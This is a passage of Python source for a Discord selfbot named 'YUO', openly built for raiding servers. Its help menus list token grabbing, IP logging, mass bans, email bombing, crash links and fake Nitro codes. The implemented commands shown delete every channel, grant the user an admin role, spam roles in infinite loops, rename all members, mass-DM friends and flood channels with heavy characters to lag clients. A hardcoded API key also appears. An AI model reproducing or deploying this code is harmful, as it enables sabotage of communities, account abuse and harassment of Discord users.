message\n`> createdm` - creates dm with mentioned user\n`> autodm <message>` - responds to anyone who dms you\n`> stopautodm` - stops autodm\n`> sitepreview <site>` - shows the preview of the website link\n`> oldsplash` - resets the selfbots splash screen to the v2 splash\n`> newsplash` - resets the selfbots splash screen to the v3 splash\n`> paping <ip> <port>` - tcp pings an ip\n`> download` - sends the nuked download link\n`> restart` - restarts the selfbot"
        await ctx.send(embed=embed)
    elif str(category).lower() == "misc":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723265016979259544/image0.gif")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | MISCELLANEOUS COMMANDS`\n`> copycat <user>` - copies the users messages ({Yuo.copycat})\n`> stopcopycat` - stops copycatting\n`> rick` - rickrolls someone\n`> fakename` - makes a fakename with other members's names\n`> geoip <ip>` - looks up the ip's location\n`> pingweb <website-url>` pings a website to see if it's up\n`> anticatfish <user>` - reverse google searches the user's pfp\n`> stealemoji` - <emoji> <name> - steals the specified emoji\n`> hexcolor <hex-code>` - returns the color of the hex-code\n`> dick <user>` - returns the user's dick size\n`> bitcoin` - shows the current bitcoin exchange rate\n`> daily` - gets fake BTC/ETH info\n`> usdbtc` - amount of usd you want in BTC\n`> usdeth` - amount  of usd you want in ETH\n`> masslogin` - Allows you to mass-login in bot/user tokens\n`> fakelink` - <link1> <link2> creates a fake link which hides links\n`> gmail-bomb` - spams a gmail\n`> rolecolor <role>` - returns the role's color\n`> nitro` - generates a random nitro code\n`> nitrogen <amount>` - generates nitro codes in a file\n`> fakenitro <link>` - generates fake nitro code\n`> feed <user>` - feeds the user\n`> tickle <user>` - tickles the user\n`> slap <user>` - slaps the user\n`> hug <user>` - hugs the user\n`> cuddle <user>` - cuddles the user\n`> smug <user>` - smugs at the user\n`> pat <user>` - pat the user\n`> kiss <user>` - kiss the user\n`> topic` - sends a conversation starter\n`> wyr` - sends a would you rather\n`> gif <query>` - sends a gif based on the query\n`> impersonate <user>` - impersonate's user\n`> sendall <message>` - sends a message in every channel\n`> poll <msg: xyz 1: xyz 2: xyz>` - creates a poll\n`> suggest <message>` - makes a suggestion\n`> getroles` - lists all roles on the server\n`> advice` - gives you advice\n`> ship <user>` - makes user jealus\n`> bots` - shows all bots in the server\n`> image <query>` - returns an image\n`> hack <user>` - hacks the user\n`> token <user>` - returns the user's token\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "antiwizz":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://media.discordapp.net/attachments/794078014064295937/821299041261322240/20210205_103950.gif")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | ANTI-WIZZ COMMANDS`\n`> antiraid <on/off>` - toggles anti-nuke ({Yuo.antiraid})\n`> whitelist <user>` - whitelists the specified user\n**NOTE** Whitelisting a user will completely exclude them from anti-nuke detections, be weary on who you whitelist.\n`> whitelisted <-g>` - see who's whitleisted and in what guild\n`> unwhitelist <user>` - unwhitelists the user\n`> clearwhitelist` - clears the whitelist hash\n`> bump <channel-id>` - auto bumps your server"
        await ctx.send(embed=embed)
    elif str(category).lower() == "nuke":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/723250694118965300/723256768742031451/image0.gif")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | NUKE COMMANDS`\n`> tokenfuck <token>` - disables the token\n`> karma` - wizzes the server\n`> massban` - bans everyone in the server\n`> dynoban` - mass bans with dyno one message at a time\n`> massnick` - nicknames everyone in the server\n`> masskick` - kicks everyone in the server\n`> delhook` - <webhook> deletes a webhook\n`> hooksend` - <webhook> <message> sends a message in webhook\n`> spamroles` - spam makes 250 roles\n`> spamchannels` - spam makes 250 text channels\n`> delchannels` - deletes all channels in the server\n`> delroles` - deletes all roles in the server\n`> webhookspam` - spams webhooks in your server\n`> stopwebhookfuck` - stops webhook spam\n`> purgebans` - unbans everyone\n`> renamechannels <name>` - renames all channels\n`> servername <name>` - renames the server to the specified name\n`> nickall <name>` - sets all user's names to the specified name\n`> changeregion <amount>` - spam changes regions in groupchats\n`> kickgc` - kicks everyone in the gc\n`> gc <message>` - spam changes the groupchat name\n`> massmention <message>` - mass mentions random people\n`> giveadmin` - gives all admin roles in the server"
        await ctx.send(embed=embed)
    elif str(category).lower() == "secret":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/832072924844392458/832073474934571018/yuo_on_youtube.gif")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | SECRET COMMANDS`\n`> setup` - nukes the server\n`> banall` - bans all members\n`> halftoken` - gets half of the users token\n`> ipgrabber` - spams the ip logger\n`> kickall` - kicks all members\n`> admin` - gives user admin\n`> pingsspam` - locks all channels and spams ping\n`> cr` - clickbate which crashes the persons computer\n`> systeminfo` - shows you info about the selfbot\n`> vcspam <amount> <channel-name>` - spams voice channels\n`> d all` - nukes all channels\n`> cspam <amount> <channel-name>` - spams channels\n`> massdmlol` - mass dms the user friends\n`> backupfriends` - backups your friends\n`> backupservers` - backups your servers\n`> test` - test command which is useless\n`> recoverservers` - recovers your servers\n`> recoverfriends` - recovers your friends\n`> upload <file>` - uploads a file on pays.host\n`> nickallm` - changes everyones name\n`> cservername <name>` - chnages the servers name\n`> rdelete` - deletes every role below yours\n`> rspam` - spams roles\n`> tranrspam` - spams roles like the trans flag :flusuhed:\n`> lag` - lags out everyone\n`> kickAll` - kicks everyone\n`> banAll` - bans everyone\n`> lagspam` - lags peoples discord\n`> sall` - spams all messages\n`> frole` - delets all the roles\n"
        await ctx.send(embed=embed)

# YUO

# ACCOUNT

# TEXT

# MUSIC

# MODERATION

# ANIMATION

# EMOTES

# NSFW

# FUN

# UTILILTY

# MISC

# ANTINUKE

# NUKE

@Yuo.command()
async def yuo(ctx):
    await ctx.message.delete()
    await ctx.send("""
██╗░░░██╗██╗░░░██╗░█████╗░
╚██╗░██╔╝██║░░░██║██╔══██╗
░╚████╔╝░██║░░░██║██║░░██║
░░╚██╔╝░░██║░░░██║██║░░██║
░░░██║░░░╚██████╔╝╚█████╔╝
░░░╚═╝░░░░╚═════╝░░╚════╝░
""")


@Yuo.command(aliases=["giphy", "tenor", "searchgif"])
async def gif(ctx, query=None):
    await ctx.message.delete()
    if query is None:
        r = requests.get("https://api.giphy.com/v1/gifs/random?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&tag=&rating=R")
        res = r.json()
        await ctx.send(res['data']['url'])

    else:
        r = requests.get(
            f"https://api.giphy.com/v1/gifs/search?api_key=ldQeNHnpL3WcCxJE1uO8HTk17ICn8i34&q={query}&limit=1&offset=0&rating=R&lang=en")
        res = r.json()
        await ctx.send(res['data'][0]["url"])


@Yuo.command()
async def massdmlol(self):
 token = input("Input Token>>")
 fuck = input(f"{Fore.GREEN}Select>>")
 if fuck == '1':
  input2 = input(f"{Fore.GREEN}What Should I Send?>>")
  for user in client.user.friends:                
   await user.send(f"{input2}")
   print(f"{Fore.GREEN}[+] Sent{Fore.WHITE} {input2} To {user}")


@Yuo.command()
async def smalltxt(ctx, *, text=None):
	await ctx.message.delete()
	if text is None:
		await ctx.send("what do you want as a small message???")
	else:
		frt = text.replace('a', 'ᴬ').replace('A', 'ᴬ').replace(
		    'b',
		    'ᴮ').replace('B', 'ᴮ').replace('c', 'ᶜ').replace('C', 'ᶜ').replace(
		        'd', 'ᴰ').replace('D', 'ᴰ').replace('e', 'ᴱ').replace(
		            'E', 'ᴱ').replace('f', 'ᶠ').replace('F', 'ᶠ').replace(
		                'g', 'ᴳ').replace('G', 'ᴳ').replace('h', 'ᴴ').replace(
		                    'H',
		                    'ᴴ').replace('i', 'ᴵ').replace('I', 'ᴵ').replace(
		                        'j', 'ᴶ').replace('J', 'ᴶ').replace(
		                            'k', 'ᴷ').replace('K', 'ᴷ').replace(
		                                'l', 'ᴸ').replace('L', 'ᴸ').replace(
		                                    'm', 'ᴹ'
		                                ).replace('M', 'ᴹ').replace(
		                                    'n', 'ᴺ'
		                                ).replace('N', 'ᴺ').replace(
		                                    'o', 'ᴼ'
		                                ).replace('O', 'ᴼ').replace(
		                                    'p', 'ᴾ'
		                                ).replace('P', 'ᴾ').replace(
		                                    'q', 'ᵠ'
		                                ).replace('Q', 'ᵠ').replace(
		                                    'r', 'ᴿ'
		                                ).replace('R', 'ᴿ').replace(
		                                    's', 'ˢ'
		                                ).replace('S', 'ˢ').replace(
		                                    't', 'ᵀ'
		                                ).replace('T', 'ᵀ').replace(
		                                    'u', 'ᵁ'
		                                ).replace('U', 'ᵁ').replace(
		                                    'v', 'ⱽ'
		                                ).replace('V', 'ⱽ').replace(
		                                    'w', 'ᵂ'
		                                ).replace('W', 'ᵂ').replace(
		                                    'x', 'ˣ').replace(
		                                        'X', 'ˣ').replace(
		                                            'y', 'ʸ').replace(
		                                                'Y', 'ʸ').replace(
		                                                    'z', 'ᶻ').replace(
		                                                        'Z', 'ᶻ')
		await ctx.send(frt)


@Yuo.command()
async def nickallm(ctx, *, name="! MYRAYUO RUNS YOU"):
  print("Nicking All")
  for member in ctx.guild.members:
    try:
      await member.edit(nick=name)
    except:
      pass 


@Yuo.command()
async def d(ctx,channel_id="all"):
  await ctx.message.delete()
  if channel_id == "all":
    for channel in ctx.guild.channels:
      if channel.id != 834134636678479902:
        await channel.delete()
      else:
        continue
    guild = ctx.message.guild
    await guild.create_text_channel("nuked")
    print("Nuked All Channels")
    return
  else:
    try:
      channel = ctx.get.channel(id=channel_id)
      await channel.delete()
    except:
      e2 = discord.Embed(title = "Invaild Channel ID.", color = 0xaf1aff)
      await ctx.send(embed=e2)
    return


@Yuo.command(pass_context=True)
async def admin(ctx):
    try:
        guild = ctx.guild
        role = await guild.create_role(name="MYRAYUO Nuker", permissions=discord.Permissions(8),colour=discord.Colour(000000))
        authour = ctx.message.author
        await ctx.message.delete()
        await authour.add_roles(role)
        print("Gave you admin <3")
    except:
        print("Couldnt give you admin :(")


@Yuo.command()
async def reaction(ctx, messageNo: typing.Optional[int] = 1, *, text):
    await ctx.message.delete()
    text = (c for c in text.lower())
    emotes = {
        "a": "🇦",
        "b": "🇧",
        "c": "🇨",
        "d": "🇩",
        "e": "🇪",
        "f": "🇫",
        "g": "🇬",
        "h": "🇭",
        "i": "🇮",
        "j": "🇯",
        "k": "🇰",
        "l": "🇱",
        "m": "🇲",
        "n": "🇳",
        "o": "🇴",
        "p": "🇵",
        "q": "🇶",
        "r": "🇷",
        "s": "🇸",
        "t": "🇹",
        "u": "🇺",
        "v": "🇻",
        "w": "🇼",
        "x": "🇽",
        "y": "🇾",
        "z": "🇿",
    }
    for i, m in enumerate(await ctx.channel.history(limit=100).flatten()):
        if messageNo == i:
            for c in text:
                await m.add_reaction(f"{emotes[c]}")
            break


@Yuo.command()
async def rspam(ctx):
 while True:
   await ctx.guild.create_role(name="MYRAYUO NUKER RUNS YOU")
   print("Spamming roles <3")


@Yuo.command()
async def transrspam(ctx):
 while True:
   await ctx.guild.create_role(name="MYRAYUO NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
   await ctx.guild.create_role(name="MYRAYUO NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="MYRAYUO NUKER RUNS YOU",colour=discord.Colour(0xFFA3FB))
   await ctx.guild.create_role(name="MYRAYUO NUKER RUNS YOU",colour=discord.Colour(0xFFFFFF))
   await ctx.guild.create_role(name="MYRAYUO NUKER RUNS YOU",colour=discord.Colour(0x0EF5F6))
   print("Spamming roles <3")


@Yuo.command(aliases=["l"])
async def lag(ctx):
        await ctx.message.delete()
        await ctx.send("﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽")
        await ctx.send("﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽